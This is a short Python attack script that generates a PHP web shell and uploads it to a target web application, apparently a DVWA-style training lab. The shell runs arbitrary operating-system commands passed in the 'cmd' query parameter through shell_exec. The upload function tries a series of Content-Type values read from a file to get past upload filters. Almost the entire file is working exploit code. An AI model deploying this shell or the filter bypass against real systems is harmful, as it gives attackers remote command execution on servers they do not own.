#!/usr/bin/env python3
import requests


def create_payload(PAYLOAD_FILENAME):
    payload_content = """<?php
    echo "<h3 style='color: green;'>[+] Malicious file uploaded successfully!</h3>";
    
    if(isset($_GET['cmd'])) {
        $commands = explode(';', $_GET['cmd']);
        foreach($commands as $command) {
            $clean_cmd = htmlspecialchars(trim($command));
            echo "<h4>=== Command: {$clean_cmd} ===</h4>";
            echo "<pre>" . shell_exec($command) . "</pre>";
        }
    } else {
        echo "<p style='color: red;'>ERROR: Add ?cmd=command1;command2</p>";
    }
    ?>"""
    with open(PAYLOAD_FILENAME, "w") as f:
        f.write(payload_content)
    print(f"[+] Payload file '{PAYLOAD_FILENAME}' created.")


def upload_file(UPLOAD_URL, PAYLOAD_FILENAME, COOKIE):
    with open("content_type.txt", "r") as f:
        file_data = f.read()

    content_types = file_data.strip().split("\n")

    for type in content_types:
        data = {"Upload": "Upload", "MAX_FILE_SIZE": "100000"}
        files = {"uploaded": (PAYLOAD_FILENAME, open(PAYLOAD_FILENAME, "rb"), type)}
        try:
            print(f"[*] Uploading file with {type}")
            response = requests.post(UPLOAD_URL, files=files, data=data, cookies=COOKIE)
            if "succesfully uploaded!" in response.text:
                print("[+] File uploaded successfully!")
                return True
            else:
                print(
                    "[-] Upload failed. Check your cookies and directory permissions."
                )
        except Exception as e:
            print(f"[-] Upload error: {str(e)}")
    return False